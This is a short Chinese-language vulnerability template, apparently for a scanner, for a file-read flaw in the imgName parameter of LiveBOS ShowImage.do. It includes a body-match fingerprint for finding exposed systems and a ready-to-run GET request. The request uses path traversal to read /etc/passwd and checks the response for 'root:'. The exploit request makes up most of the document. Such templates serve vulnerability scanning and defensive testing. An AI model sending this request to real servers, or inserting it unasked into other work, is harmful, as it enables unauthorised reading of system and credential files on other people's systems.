LiveBOS(简称LiveBOS)是顶点软件股份有限公司开发的一个对象型业务架构中间件及其集成开发工具。LiveBos ShowImage.do文件imgName 参数存在文件读取漏洞，攻击者可以获取大量敏感信息。

Condition: body="LiveBos" || body="/react/browser/loginBackground.png"

poc:

relative: req0
session: false
requests:
- method: GET
timeout: 10
path: /feed/ShowImage.do;js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
headers:
	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64)AppleWebKit/537.36 (KHTML,like Gecko) Chrome/69.0.1141.87 Safari/537.36
follow_redirects: true
matches:(code.eq("200") && body.contains( "home/livebos")&& body.contains("root:"))
